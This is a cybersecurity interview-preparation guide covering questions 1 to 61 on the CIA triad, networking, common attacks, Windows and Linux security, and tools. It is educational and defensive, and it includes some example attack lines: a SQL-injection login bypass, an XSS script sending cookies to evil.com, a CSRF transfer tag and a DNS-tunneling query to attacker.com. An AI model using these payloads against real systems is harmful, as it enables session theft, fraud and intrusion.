# 100 Entry-Level Cybersecurity Interview Questions
### Written from the interviewer's chair — what we actually ask, and why

---

> **How to use this guide:**
> Don't read it like a textbook. Cover the answer, say your response out loud, then check.
> The goal isn't to memorise words — it's to understand ideas well enough to explain them to someone who has never heard of them.
> If you can do that, you'll ace the interview.

---

## SECTION 1: CORE SECURITY CONCEPTS
*These are the first questions almost every interviewer asks. Get these perfect.*

---

**1. What is the CIA Triad and why does it matter?**

The three pillars that every security decision is built on:

- **Confidentiality** — Only the right people can see the data. Achieved through encryption, access controls, and authentication.
- **Integrity** — Data hasn't been altered without authorisation. Achieved through hashing, digital signatures, and audit logs.
- **Availability** — Systems and data are accessible when needed. Achieved through redundancy, backups, and DDoS protection.

**Why it matters in an interview:** Interviewers use this as a foundation. When they describe an attack scenario, they'll often ask "which of the three does this attack target?" Be ready to map any attack to one or more of the three.

> *Example:* Ransomware attacks all three — it encrypts data (confidentiality lost), locks your files (integrity violated), and makes systems unusable (availability destroyed).

---

**2. What is the difference between authentication and authorisation?**

These are commonly confused, but they answer two completely different questions:

- **Authentication** — *Who are you?* Verifying identity. Logging in with a password authenticates you.
- **Authorisation** — *What are you allowed to do?* Determining permissions after identity is confirmed.

> *Example:* You badge into an office building (authentication — you proved who you are). Once inside, you can only enter rooms your keycard is programmed to open (authorisation — what you're permitted to do).

The important distinction: authentication always comes first. You can't authorise someone whose identity you haven't confirmed.

---

**3. What is the principle of least privilege?**

Give users, systems, and processes only the minimum access they need to do their job — nothing more.

**Why it's important:** If an account is compromised, least privilege limits the damage. A marketing intern with access only to the marketing folder can't accidentally (or maliciously) touch the finance database.

> *Real-world application:* A web server process should be able to read web files and accept connections — it should not have permission to modify system files or access the database directly.

---

**4. What is Defence in Depth?**

A layered security strategy. Instead of relying on one strong control, you have multiple independent layers — so if one fails, others are still standing.

Think of it like a medieval castle: moat → outer wall → inner wall → keep. An attacker who crosses the moat still faces three more barriers.

> *Example in practice:* Your email filtering blocks the phishing email. If it gets through, the user's antivirus catches the attachment. If that fails, EDR detects the malicious process. If that fails, network monitoring catches the C2 callback. You win if any layer works.

---

**5. What is the difference between a threat, vulnerability, and risk?**

Three different things that people often mix up:

- **Vulnerability** — A weakness that could be exploited. An unpatched web server is a vulnerability.
- **Threat** — An actor or event that could exploit a vulnerability. A hacker targeting web servers is a threat.
- **Risk** — The likelihood and impact of a threat exploiting a vulnerability.

> *The formula:* Risk = Likelihood × Impact

> *Example:* Unpatched Apache server (vulnerability) + active exploit circulating online (threat) = **High risk**. An unpatched internal tool with zero internet exposure = **Low risk**. Same vulnerability, very different risk because the threat likelihood is different.

---

**6. What are the four ways to respond to risk?**

- **Avoidance** — Stop doing the risky thing entirely. Don't collect data you don't need.
- **Mitigation** — Reduce the risk by adding controls. Patch the system, add a firewall.
- **Transfer** — Move the financial impact to someone else. Buy cyber insurance.
- **Acceptance** — Decide the risk is low enough to live with (documented decision).

> *Interview tip:* Acceptance is not ignoring a risk. It's a conscious, documented decision that the cost of mitigation exceeds the risk. There's a big difference.

---

**7. What is separation of duties?**

No single person should have enough access to both commit and conceal a harmful action. Two people are required for sensitive actions to prevent fraud.

> *Example:* The person who submits a payment cannot also be the person who approves it. A developer shouldn't also have the ability to push code directly to production without a review process.

---

**8. What is multi-factor authentication (MFA) and what are the three factors?**

MFA requires two or more different types of proof before granting access.

The three factor types:
- **Something you know** — Password, PIN
- **Something you have** — Phone (OTP app), hardware token, smart card
- **Something you are** — Biometrics: fingerprint, face, retina

**Critical rule:** Two of the *same* type is not MFA. Two passwords = not MFA. A password + a phone OTP = MFA.

> *Why it matters:* Even if an attacker steals your password, they can't log in without your phone. MFA stops the majority of account takeover attacks.

---

**9. What is social engineering?**

Manipulating people psychologically into performing actions or revealing information — instead of exploiting technology.

The most common types:
- **Phishing** — Fraudulent email designed to steal credentials or deliver malware
- **Spear Phishing** — Phishing targeted at a specific person using personal details
- **Vishing** — Voice call deception ("I'm from IT, I need your password to fix your account")
- **Pretexting** — Creating a fabricated scenario to build trust
- **Tailgating** — Physically following someone through a secured door

> *Why it's effective:* People are the hardest vulnerability to patch. A perfectly secured system can be bypassed by calling an employee and asking them to reset their password.

---

**10. What is the difference between symmetric and asymmetric encryption?**

- **Symmetric** — The same key encrypts and decrypts the data. Fast and efficient for large data. The challenge: how do you securely share the key? *(AES is the most common)*
- **Asymmetric** — Uses a key pair: a public key (shared openly) and a private key (kept secret). What the public key encrypts, only the private key can decrypt. Slower, but solves the key-sharing problem. *(RSA is the most common)*

> *How they work together in practice:* When you visit a website over HTTPS, asymmetric encryption securely exchanges a session key, then symmetric encryption handles the actual data transfer. You get the security of asymmetric and the speed of symmetric.

---

**11. What is hashing and how is it different from encryption?**

- **Encryption** is two-way — you can decrypt it back to the original if you have the key. Used for data you need to read later.
- **Hashing** is one-way — you cannot reverse it to get the original input. Used when you only need to verify something, not retrieve it.

> *Why passwords are hashed, not encrypted:* When you log in, the system hashes your input and compares it to the stored hash. It never needs to know your actual password — just whether the hashes match. If the database is stolen, attackers get hashes, not passwords.

> *Common algorithms:* SHA-256 is strong. MD5 and SHA-1 are broken — never recommend them.

---

**12. What is a firewall and what does it do?**

A firewall controls network traffic — deciding which connections to allow or block based on rules. It sits between networks (or between a network and the internet) and acts as a gatekeeper.

- **Stateless firewall** — Evaluates each packet individually using fixed rules (source IP, destination IP, port). Has no memory of previous packets.
- **Stateful firewall** — Tracks the state of connections. Knows if an inbound packet is a legitimate reply to an outbound request or an uninvited probe. Much smarter.

> *Example:* A stateless firewall might allow all inbound traffic on port 443. A stateful firewall only allows inbound port 443 traffic that is in response to a connection your network initiated.

---

**13. What is the difference between IDS and IPS?**

- **IDS (Intrusion Detection System)** — Watches traffic and alerts you when something looks suspicious. It does not block anything — it is purely a detection and notification tool.
- **IPS (Intrusion Prevention System)** — Watches traffic and actively blocks threats. It sits inline (traffic passes through it).

> *Analogy:* IDS is a burglar alarm — it tells you someone broke in. IPS is a security guard — it physically stops the intruder.

> *Trade-off:* IPS can break legitimate traffic if it produces false positives. Most mature organisations use both.

---

**14. What is a VPN and how does it work?**

A VPN (Virtual Private Network) creates an encrypted tunnel between your device and a remote network, protecting the data in transit from anyone who might intercept it.

How it works: Your traffic is encapsulated (wrapped inside another protocol) and encrypted before leaving your device. It travels through the internet encrypted, decrypts at the VPN server, and then reaches its destination.

> *Use cases:* Remote workers accessing internal company resources securely. Encrypting traffic on untrusted public Wi-Fi. Site-to-site VPNs connecting office locations.

---

**15. What is Zero Trust and how does it differ from traditional security?**

**Traditional model:** Trust everyone inside the network. The perimeter (firewall) keeps the bad guys out, and once you're inside, you're trusted.

**Zero Trust:** "Never trust, always verify." No user or device is trusted by default, regardless of whether they're inside or outside the network. Every access request must be authenticated and authorised.

> *Why it matters now:* The traditional model assumes a clear inside/outside. With remote work, cloud, and mobile, there is no clear perimeter anymore. Zero Trust assumes the perimeter doesn't exist.

---

## SECTION 2: NETWORKING FUNDAMENTALS
*You will be asked networking questions in almost every cybersecurity interview.*

---

**16. What is the OSI model? Name the 7 layers.**

The OSI model is a framework that describes how data travels across a network, split into seven layers of responsibility:

| Layer | Name | What it does |
|-------|------|-------------|
| 7 | Application | User-facing protocols: HTTP, DNS, FTP, SMTP |
| 6 | Presentation | Data format, encryption, compression |
| 5 | Session | Establishing and managing sessions |
| 4 | Transport | Reliable delivery, ports: TCP/UDP |
| 3 | Network | IP addressing and routing |
| 2 | Data Link | MAC addresses, switching, ARP |
| 1 | Physical | Cables, signals, hardware |

> *Why interviewers ask this:* They want to know if you can identify where an attack operates. ARP spoofing = Layer 2. IP spoofing = Layer 3. A WAF protects Layer 7. This framework lets you think about defence at the right level.

---

**17. What is the difference between TCP and UDP?**

Both are Layer 4 (Transport) protocols, but they have different approaches:

- **TCP** — Connection-oriented. Before any data is sent, a Three-Way Handshake establishes the connection. Guarantees delivery, order, and error checking. Slower but reliable. Used for: HTTP, HTTPS, SSH, FTP, email.
- **UDP** — Connectionless. Just sends packets — no handshake, no confirmation. Faster but no guaranteed delivery. Used for: DNS, VoIP, video streaming, gaming.

> *Security context:* TCP's handshake is exploited in SYN flood attacks. UDP's lack of state makes it useful for amplification DDoS attacks (small request, large response sent to spoofed victim IP).

---

**18. What is the Three-Way Handshake?**

How TCP establishes a connection in three steps:

1. **SYN** — Client sends: "I want to connect"
2. **SYN-ACK** — Server replies: "I got your request, here's my confirmation"
3. **ACK** — Client replies: "Confirmed" — connection is open

> *Attack:* A SYN Flood sends thousands of SYN packets but never sends the final ACK. The server allocates resources for each half-open connection waiting for a response that never comes — eventually running out of resources and denying service to legitimate users.

---

**19. What are the most important ports you should know?**

| Port | Protocol | Security Note |
|------|----------|--------------|
| 22 | SSH | Secure remote access — replaces Telnet |
| 23 | Telnet | Insecure — sends everything in plaintext, avoid |
| 25 | SMTP | Email sending — abused for spam |
| 53 | DNS | Name resolution — watch for tunneling |
| 80 | HTTP | Unencrypted web — should redirect to 443 |
| 443 | HTTPS | Encrypted web — standard |
| 445 | SMB | Windows file sharing — exploited by WannaCry |
| 3389 | RDP | Windows Remote Desktop — frequent attack target |
| 389 | LDAP | Directory queries — plaintext, use 636 instead |
| 636 | LDAPS | LDAP over TLS — encrypted version |
| 1433 | MSSQL | Microsoft SQL Server |
| 3306 | MySQL | MySQL database |

> *Interview tip:* If an interviewer asks "you see unexpected traffic on port 4444 — what do you think?" The answer is: that's the default Metasploit reverse shell port. Likely indicates compromise or an active pentest.

---

**20. What is DNS and how does it work?**

DNS (Domain Name System) translates human-readable domain names into IP addresses — because computers route traffic by IP, not by name.

When you type `google.com`:
1. Your browser checks its own cache
2. Your OS checks the hosts file
3. Your local resolver (router/ISP) is queried
4. If it doesn't know, it asks the Root DNS servers
5. Root points to the `.com` TLD server
6. TLD server points to Google's authoritative DNS
7. Authoritative DNS returns the IP address
8. Your browser connects

> *Security attacks on DNS:* DNS cache poisoning (inserting false records), DNS tunneling (hiding data in DNS queries to bypass firewalls), DNS hijacking (redirecting queries to malicious servers).

---

**21. What is ARP and why is ARP spoofing dangerous?**

**ARP (Address Resolution Protocol)** resolves IP addresses to MAC addresses at Layer 2. When your computer wants to send data to 192.168.1.1 and doesn't know the MAC address, it broadcasts "Who has 192.168.1.1?" — the owner replies with its MAC.

**ARP Spoofing:** An attacker sends fake ARP replies claiming "192.168.1.1 is at MY MAC address." Other devices update their ARP tables with the false information. Traffic intended for the router now flows through the attacker — a Man-in-the-Middle (MITM) attack.

> *Defence:* Dynamic ARP Inspection (DAI) on managed switches, which validates ARP packets against a trusted binding table.

---

**22. What is DHCP and what is DORA?**

**DHCP (Dynamic Host Configuration Protocol)** automatically assigns IP addresses to devices joining a network. Without it, every device would need a manually configured IP.

**DORA** describes the four-step process:
- **Discover** — New device broadcasts: "Is there a DHCP server here?"
- **Offer** — Server responds: "I can offer you 192.168.1.50"
- **Request** — Device says: "I'll take that IP"
- **Acknowledge** — Server confirms: "It's yours"

> *Security concern:* A **rogue DHCP server** — an attacker's device that responds to DHCP requests before the legitimate server — can hand out malicious gateway and DNS settings, redirecting all traffic.

---

**23. What is NAT and why is it used?**

NAT (Network Address Translation) allows many devices with private IP addresses to share a single public IP address when accessing the internet.

Private IP ranges (not routable on the internet): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`

Your home router uses **PAT (Port Address Translation)** — the most common form. It tracks which internal device made which connection using unique port numbers, so it knows where to send return traffic.

> *Security benefit:* NAT obscures internal network structure from the outside. Devices behind NAT are not directly reachable from the internet without explicit port forwarding.

---

**24. What is the difference between a hub, switch, and router?**

- **Hub** — Layer 1. Broadcasts all traffic to every device. Outdated and inefficient. Creates security problems because everyone sees everyone's traffic.
- **Switch** — Layer 2. Sends traffic only to the intended device using MAC addresses. Much more efficient and private.
- **Router** — Layer 3. Connects different networks. Uses IP addresses to determine where to forward traffic. Your home device connecting your network to the internet.

---

**25. What is VLAN and why is it used?**

A VLAN (Virtual LAN) logically divides a physical network into separate segments. Devices in different VLANs cannot communicate with each other without going through a router (or Layer 3 switch) — even if they're physically connected to the same switch.

> *Use case:* A company puts HR computers in VLAN 10 and Finance in VLAN 20. Even though they share physical switches, HR can't access Finance systems. This limits the blast radius if HR's network is compromised.

---

**26. What is the difference between IDS and IPS (expanded scenario)?**

You're monitoring network traffic and notice a pattern matching a known exploit. Walk through what happens with each:

- **With IDS:** An alert is generated and sent to the SIEM. A SOC analyst reviews it. By the time they act, the exploit may have succeeded. IDS is a detective control.
- **With IPS:** The packet is automatically dropped before it reaches the target. The threat is stopped in real time. IPS is a preventive control.

> *When IDS is preferred:* When false positives are a concern — IPS blocking legitimate traffic causes outages. In critical environments, some teams prefer to detect and manually decide rather than auto-block.

---

**27. What is a proxy and how does it differ from a VPN?**

- **Proxy** — Acts as an intermediary for a specific application (usually web browsing). Your requests go to the proxy, which forwards them to the destination. The destination sees the proxy's IP, not yours. Does not encrypt traffic by default.
- **VPN** — Creates an encrypted tunnel for all traffic from your device. Hides both your IP and the contents of your traffic. Operates at the OS level, not just one application.

> *Security use of proxies:* **Forward proxy** — controls and monitors outbound employee internet traffic. **Reverse proxy** — sits in front of web servers, protects them from direct exposure, can provide load balancing and WAF capabilities.

---

**28. What is a DMZ?**

A DMZ (Demilitarized Zone) is a network segment that sits between the public internet and the internal private network. It hosts services that need to be publicly accessible — web servers, mail servers, DNS servers — while keeping them isolated from internal systems.

```
Internet → [Firewall 1] → DMZ → [Firewall 2] → Internal Network
```

> *Why this matters:* If the public web server in the DMZ gets compromised, the attacker is still blocked from the internal network by the second firewall. The breach is contained.

---

**29. What is a Man-in-the-Middle (MITM) attack?**

An attacker secretly positions themselves between two parties who believe they're communicating directly. The attacker can read, modify, or inject traffic without either party knowing.

> *Common methods:* ARP spoofing, rogue Wi-Fi hotspots, SSL stripping (downgrading HTTPS to HTTP), DNS spoofing.

> *Example:* You connect to "Free_Airport_WiFi" controlled by an attacker. You think you're connecting directly to your bank. The attacker sees all your traffic, captures your login credentials.

> *Defence:* HTTPS (TLS) with proper certificate validation, HSTS (forces HTTPS), avoiding untrusted networks, VPN.

---

**30. What is a DoS vs DDoS attack?**

- **DoS (Denial of Service)** — A single attacker floods a target with traffic or requests, overwhelming it so legitimate users can't be served.
- **DDoS (Distributed DoS)** — The same idea but using thousands or millions of compromised machines (a botnet), making it far harder to block because the traffic comes from everywhere.

> *Types of DDoS:* Volumetric (bandwidth exhaustion), Protocol (SYN flood, targeting network stack), Application layer (HTTP flood targeting web servers).

> *Defence:* Rate limiting, traffic scrubbing services (Cloudflare, Akamai), anycast routing, upstream filtering by ISP.

---

**31. What is HTTPS and how does TLS work at a high level?**

HTTPS is HTTP with TLS (Transport Layer Security) encryption. It does three things: encrypts the data in transit, verifies the server's identity, and ensures data integrity.

**TLS Handshake (simplified):**
1. Client says hello — lists supported cipher suites
2. Server replies — chooses cipher, sends its certificate
3. Client verifies the certificate against trusted Certificate Authorities
4. Both sides negotiate a shared session key (using asymmetric crypto)
5. All subsequent data is encrypted with that session key (symmetric crypto)

> *What to look for:* Always verify the padlock + correct domain in your browser. Certificate warnings should never be clicked through.

---

**32. What is the difference between HTTP and HTTPS from a security standpoint?**

- **HTTP** — Plaintext. Anyone on the network path can read the content, including usernames, passwords, and any data submitted.
- **HTTPS** — Encrypted with TLS. Even if someone captures the traffic, they see cipher text. Also authenticates the server — you know you're talking to the real site.

> *Security point:* Never transmit sensitive data over HTTP. A login form served over HTTP that submits to HTTPS is still vulnerable — the page itself can be modified in transit.

---

**33. What is DNS tunneling?**

Using DNS queries to covertly send data out of a network — bypassing firewalls that block other outbound traffic but allow DNS.

> *How it works:* The attacker encodes data into DNS query subdomains: `dGhpcyBpcyBzZWNyZXQ=.attacker.com`. The DNS query exits the network normally, and the attacker's authoritative DNS server receives and decodes the data.

> *Detection:* Unusually long DNS query names, high volume of queries to a single external domain, base64-looking subdomains.

---

**34. What is port scanning and what does it tell an attacker?**

Port scanning probes a target's IP address to discover which ports are open, what services are running, and what software versions are in use. This is typically one of the first steps in reconnaissance.

> *Tool:* Nmap is the most common. `nmap -sV target` reveals open ports and service versions.

> *Why it matters defensively:* Running a port scan against your own systems tells you what's exposed. Every unnecessary open port is an attack surface that should be closed.

---

**35. What is the difference between black box, white box, and grey box testing?**

These describe how much knowledge the tester has before starting:

- **Black box** — No prior knowledge. Simulates an external attacker who knows nothing about the target.
- **White box** — Full knowledge: source code, architecture, credentials. Most thorough — nothing is hidden.
- **Grey box** — Partial knowledge. Simulates an insider, a compromised account, or a vendor with limited access.

---

## SECTION 3: COMMON ATTACKS & HOW TO DEFEND AGAINST THEM
*The section interviewers use to see if you think like a defender.*

---

**36. What is phishing and how do you defend against it?**

Phishing is a deceptive email (or message) designed to trick the recipient into revealing credentials, clicking a malicious link, or opening a malicious attachment.

**Variants:**
- **Spear phishing** — Targeted at a specific individual, personalised using OSINT
- **Whaling** — Spear phishing aimed at executives (CEO, CFO)
- **Business Email Compromise (BEC)** — Impersonating executives to authorise fraudulent wire transfers

**Defences:**
- Email authentication: SPF, DKIM, and DMARC (prevent spoofing)
- Email gateway filtering (scan attachments, check URLs)
- Security awareness training (teach users to spot red flags)
- MFA (even if credentials are stolen, attacker can't log in)
- Report button in email clients to make reporting frictionless

---

**37. What are SPF, DKIM, and DMARC?**

Three email authentication standards that together prevent email spoofing:

- **SPF (Sender Policy Framework)** — A DNS record that lists which servers are authorised to send email for your domain. If an email comes from an unlisted server, it fails SPF.
- **DKIM (DomainKeys Identified Mail)** — A cryptographic signature added to emails. The receiver verifies it using a public key in your DNS. Proves the email wasn't tampered with in transit.
- **DMARC** — A policy that tells receiving servers what to do when SPF or DKIM fails: `none` (just report), `quarantine` (move to spam), or `reject` (drop it entirely). Also sends reports back to you about who's sending email on your behalf.

> *Together:* If an attacker tries to send an email pretending to be from your CEO, SPF fails (wrong server), DKIM fails (no valid signature), and DMARC rejects it. The target never sees it.

---

**38. What is SQL Injection (SQLi) and how do you prevent it?**

SQL injection inserts malicious SQL code into input fields that gets executed by the backend database.

> *Classic example:* Login form with username field. Attacker enters: `admin' --`
> The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`
> The `--` comments out the password check entirely. Attacker is logged in as admin.

> *Impact:* Data theft, authentication bypass, deleting entire tables, in some cases system-level command execution.

**Prevention:**
- **Parameterised queries / prepared statements** — The only reliable fix. User input is treated as data, never as part of the query structure.
- Input validation and WAF as supporting controls, not primary fixes.

---

**39. What is Cross-Site Scripting (XSS)?**

An attacker injects malicious JavaScript into a web page that executes in another user's browser.

**Types:**
- **Stored XSS** — Malicious script is saved in the database (e.g., in a comment field) and executes for every user who views it.
- **Reflected XSS** — Script is embedded in a URL; executes when the victim clicks the crafted link.

> *Example impact:* Attacker posts a comment containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Every user who reads the comment has their session cookie sent to the attacker, who can then impersonate them.

**Prevention:** Output encoding (treat user input as text, not code), Content Security Policy (CSP) headers, HTTPOnly cookie flag (prevents JavaScript accessing cookies).

---

**40. What is Cross-Site Request Forgery (CSRF)?**

Tricks an authenticated user's browser into sending a request to a website they're logged into — without their knowledge.

> *Example:* You're logged into your bank. You visit an attacker's page containing:
> `<img src="https://bank.com/transfer?to=attacker&amount=5000">`
> Your browser loads the image, which sends the transfer request with your session cookie. The bank processes it as legitimate.

**Prevention:** CSRF tokens (a unique secret in every form that the attacker can't predict), SameSite cookie attribute, re-authentication for sensitive actions.

---

**41. What is a brute force attack and how do you stop it?**

Systematically trying every possible combination of credentials until one works.

**Variants:**
- **Dictionary attack** — Uses a list of common passwords (rockyou.txt) rather than every possible combination
- **Credential stuffing** — Using stolen username/password pairs from other breaches to try against new targets

**Defences:**
- Account lockout after N failed attempts
- Rate limiting on login endpoints
- CAPTCHA to prevent automated attempts
- MFA — even if password is found, attacker can't log in
- Password managers encouraging strong, unique passwords

---

**42. What is a rainbow table attack and how does salting prevent it?**

A rainbow table is a pre-computed database of hash values and their corresponding plaintext passwords. Instead of cracking a hash (which takes time), an attacker just looks it up.

**How salting defeats it:** Before hashing, a random unique value (the salt) is added to each password. `SHA256("password" + "xK9mZ")` produces a completely different hash than `SHA256("password" + "pQ3rT")`. The attacker would need a separate rainbow table for every possible salt — making pre-computation infeasible.

> *Best practice:* Use bcrypt, scrypt, or Argon2 for password hashing — they're intentionally slow and include salting automatically.

---

**43. What is malware? Name the main types.**

Malware (malicious software) is any software designed to harm, exploit, or unauthorisedly access systems.

| Type | What it does |
|------|-------------|
| **Virus** | Attaches to legitimate files; spreads when files are shared |
| **Worm** | Self-replicates and spreads across networks without human interaction |
| **Trojan** | Disguised as legitimate software; user installs it voluntarily |
| **Ransomware** | Encrypts files and demands payment for the decryption key |
| **Spyware** | Monitors user activity and sends data to the attacker |
| **Keylogger** | Records keystrokes to capture passwords and sensitive data |
| **Rootkit** | Hides itself and other malware from the OS and security tools |
| **Botnet** | Network of infected machines controlled remotely |
| **Adware** | Displays unwanted ads; often bundled with free software |

---

**44. What is ransomware and what is the recommended defence strategy?**

Ransomware encrypts a victim's files and demands a ransom for the decryption key. Modern ransomware also exfiltrates data first and threatens to publish it (double extortion).

**Defence strategy:**
- **Backups** following the 3-2-1 rule: 3 copies, 2 different media types, 1 offsite/offline — and test restoration regularly
- **Patch management** — Ransomware often spreads via known vulnerabilities
- **Email filtering** — Most ransomware enters via phishing
- **Endpoint protection / EDR** — Detect ransomware behaviour before encryption spreads
- **Network segmentation** — Limits how far ransomware can spread
- **Least privilege** — If the infected account can't access network shares, ransomware can't encrypt them

---

**45. What is a zero-day vulnerability?**

A vulnerability that is unknown to the software vendor and the public — meaning there is no patch available. Attackers who discover them can exploit them with no defences in place.

> *Name origin:* The vendor has had "zero days" to fix it.

> *Why it's serious:* Even fully patched, up-to-date systems are vulnerable. Defence relies on behaviour-based detection (EDR, anomaly detection) rather than signature-based tools.

---

**46. What is privilege escalation?**

Gaining more system access than you were originally granted.

- **Vertical escalation** — Going from a standard user to admin/root
- **Horizontal escalation** — Accessing another user's data or account at the same privilege level

> *Example (vertical, Linux):* A standard user finds a program with the SUID bit set (it runs as root regardless of who executes it). They exploit it to spawn a root shell.

> *Example (horizontal, web app):* A logged-in user changes the `user_id` parameter in a URL from `1234` to `1235` and views another customer's order history.

---

**47. What is a Man-in-the-Browser (MitB) attack?**

A variant of MITM where malware infects the browser itself. The attacker can modify web pages as they're displayed to the user, intercept form submissions, and manipulate transactions — even when the connection is over HTTPS.

> *Example:* Banking Trojan modifies the transfer page so that the user sees `Transfer to Mum: £100` but the malware changes the destination account in the actual transaction.

> *Why HTTPS doesn't protect here:* The malware operates after decryption, inside the browser, before the user sees it.

---

**48. What is an insider threat?**

A security threat originating from within the organisation — employees, contractors, former staff, or trusted third parties.

**Types:**
- **Malicious insider** — Intentionally steals data, sabotages systems, or commits fraud
- **Negligent insider** — Accidentally causes harm through carelessness (sending sensitive data to wrong address, clicking phishing links)
- **Compromised insider** — Legitimate account taken over by an external attacker

> *Detection:* User Behaviour Analytics (UBA/UEBA) — flagging unusual access patterns, abnormal data downloads, off-hours logins, access to resources outside normal role.

---

**49. What is OSINT and how is it used in attacks?**

OSINT (Open-Source Intelligence) is gathering information about a target from publicly available sources — before making any direct contact with their systems.

> *Sources an attacker uses:*
> - **LinkedIn** — org chart, technologies used, employee names and roles
> - **Job postings** — reveals tech stack ("must know Kubernetes, AWS, PostgreSQL")
> - **GitHub** — leaked API keys, credentials in code, internal tooling
> - **WHOIS/DNS** — domain registration details, subdomains
> - **Shodan** — internet-facing devices and services
> - **Google Dorking** — advanced search operators to find exposed files and login pages

> *Defence:* Minimise public exposure — remove sensitive info from job postings, train developers not to commit secrets to public repos, monitor for data leakage.

---

**50. What is the difference between a vulnerability scan and a penetration test?**

| | Vulnerability Scan | Penetration Test |
|--|-------------------|-----------------|
| **Method** | Automated tooling | Manual + tools |
| **Exploits?** | No — finds, doesn't exploit | Yes — exploits to prove impact |
| **Output** | List of potential vulnerabilities | Demonstrated real-world attack paths |
| **Frequency** | Continuous / regular | Periodic (quarterly, annually) |
| **Who does it?** | Security team / automated | Specialist testers |

> *Analogy:* A vulnerability scan checks whether your doors and windows are locked. A penetration test actually tries to break in and tells you exactly how they got through.

---

## SECTION 4: OPERATING SYSTEM SECURITY
*Interviewers test whether you can work with the OS where attacks actually happen.*

---

**51. What is the Windows Registry and why does it matter in security?**

The Windows Registry is a hierarchical database storing configuration settings for the OS, applications, and hardware. It controls how Windows starts and how programs behave.

> *Security relevance:* Malware commonly uses registry keys for persistence — adding entries to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` ensures the malware starts automatically when the user logs in.

> *Key hives:*
> - `HKLM` (HKEY_LOCAL_MACHINE) — system-wide settings
> - `HKCU` (HKEY_CURRENT_USER) — settings for the current user

---

**52. What are the most important Windows Event IDs a SOC analyst must know?**

| Event ID | Meaning | Why it matters |
|----------|---------|---------------|
| **4624** | Successful login | Baseline — check logon type |
| **4625** | Failed login | Pattern of many = brute force |
| **4648** | Login with explicit credentials | Lateral movement indicator |
| **4672** | Admin privileges assigned at login | High-value account activity |
| **4688** | New process created | Detects malicious processes, LOLBin abuse |
| **4698** | Scheduled task created | Persistence mechanism |
| **4720** | User account created | Could be attacker creating backdoor account |
| **4728/4732** | User added to security group | Privilege escalation |
| **1102** | Security log cleared | **Critical — attacker covering tracks** |
| **7045** | New service installed | Persistence mechanism |

> *Interview scenario:* "You see 5,000 Event ID 4625s followed by one 4624. What does this mean?" Answer: A brute force attack succeeded. Immediately investigate the account and the source IP.

---

**53. What are Logon Types in Windows Event ID 4624?**

The Logon Type field tells you *how* the user authenticated:

| Type | Name | What it means |
|------|------|--------------|
| 2 | Interactive | Physical keyboard login at console |
| 3 | Network | Access to shared resource from network |
| 4 | Batch | Scheduled task ran |
| 5 | Service | Service account started a service |
| 7 | Unlock | Screen was unlocked |
| 10 | RemoteInteractive | RDP connection |
| 11 | CachedInteractive | Logged in using cached credentials |

> *Why Type 3 matters:* Unusual Type 3 logins from a workstation account to a server at 3am = likely lateral movement.

---

**54. What is the Linux file permission system and how does chmod work?**

Linux permissions are expressed as `rwx` for three groups: **owner**, **group**, and **others**.

- `r` = read (value: 4)
- `w` = write (value: 2)
- `x` = execute (value: 1)

`ls -la` shows permissions like: `-rwxr-xr--`
- First character: file type (`-` = file, `d` = directory)
- Next three: owner permissions (rwx = 7)
- Next three: group permissions (r-x = 5)
- Last three: others (r-- = 4)

`chmod 755 file` — owner gets full access (7=rwx), group and others get read+execute (5=r-x)

---

**55. What is SUID in Linux and why is it a security risk?**

SUID (Set User ID) is a special permission bit. When set on an executable, the program runs with the file owner's privileges — typically root — regardless of who executes it.

> *Legitimate use:* `/usr/bin/passwd` needs root to write `/etc/shadow`. SUID allows any user to run it while the program itself runs as root.

> *Security risk:* If `bash`, `python`, `vim`, or `find` have SUID root set, any user can exploit them to get a root shell. This is a common privilege escalation path.

> *Find SUID files:* `find / -perm -4000 -type f 2>/dev/null`

---

**56. What is sudo and how is it different from running as root?**

`sudo` (superuser do) allows a specific command to be run with elevated privileges without the user being logged in as root. Access is controlled by `/etc/sudoers`.

**Why this is better than logging in as root:**
- Actions are logged (`/var/log/auth.log`)
- Each admin uses their own account (accountability)
- Privileges can be granularly controlled per user per command
- Mistakes as root are catastrophic — sudo limits the scope

---

**57. What are the most important Linux log files for a security analyst?**

| File | What it contains |
|------|----------------|
| `/var/log/auth.log` | SSH logins, sudo usage, authentication attempts |
| `/var/log/syslog` | General system events |
| `/var/log/kern.log` | Kernel-level messages |
| `/var/log/apache2/access.log` | Every HTTP request to the web server |
| `/var/log/apache2/error.log` | Web server errors |
| `/var/log/audit/audit.log` | Detailed security events (if auditd is running) |

> *Quick command:* `grep "Failed password" /var/log/auth.log` — shows all failed SSH attempts.

---

**58. What is the /etc/passwd and /etc/shadow file?**

- `/etc/passwd` — Contains user account information: username, UID, GID, home directory, shell. World-readable. The password field just shows `x` — meaning look in shadow.
- `/etc/shadow` — Contains the actual password hashes. Only readable by root. Also contains password expiry information.

> *Why they're separate:* If hashes were in `/etc/passwd`, any local user could read it and attempt offline cracking. Separation enforces access control on the sensitive data.

---

**59. What is Active Directory at a basic level?**

Active Directory (AD) is Microsoft's directory service — it is the centralised system that manages users, computers, groups, and policies in a Windows enterprise environment.

Key components:
- **Domain** — A logical grouping (e.g., `company.com`)
- **Domain Controller (DC)** — The server running AD that handles authentication
- **Organisational Unit (OU)** — A container inside a domain (e.g., "IT Department")
- **Group Policy (GPO)** — Rules pushed to computers and users centrally (e.g., enforce screen lock, block USB)

> *Why it's a security target:* AD is the keys to the kingdom. Control over AD means control over every user and computer in the organisation.

---

**60. What is NTLM and Kerberos at a basic level?**

These are the two Windows authentication protocols:

**NTLM** — Challenge-response protocol. Server sends a random challenge; client encrypts it with their password hash and sends it back. Older, weaker, but still used as a fallback. Vulnerable to relay attacks.

**Kerberos** — Ticket-based system. A trusted third party (Key Distribution Center) issues encrypted tickets that prove identity. More secure than NTLM. Default in modern AD environments.

> *Basic entry-level understanding:* Know that Kerberos is preferred and more secure, NTLM is legacy and has known weaknesses. You don't need to know the full Kerberos ticket flow for an entry-level role, but you should know *why* Kerberos is better.

---

## SECTION 5: SECURITY TOOLS & TECHNOLOGIES

---

**61. What is Wireshark and what would you use it for?**

Wireshark is a network packet analyser — it captures and lets you inspect every packet on a network interface. It's the most widely used tool for network troubleshooting and forensic analysis.

> *Security uses:* Investigating suspicious traffic, analysing malware behaviour, detecting unencrypted credentials, identifying port scans, verifying firewall rules.

> *Basic filters:*
> - `dns` — show all DNS traffic
> - `http` — show HTTP requests
> - `tcp.port == 445` — show SMB traffic
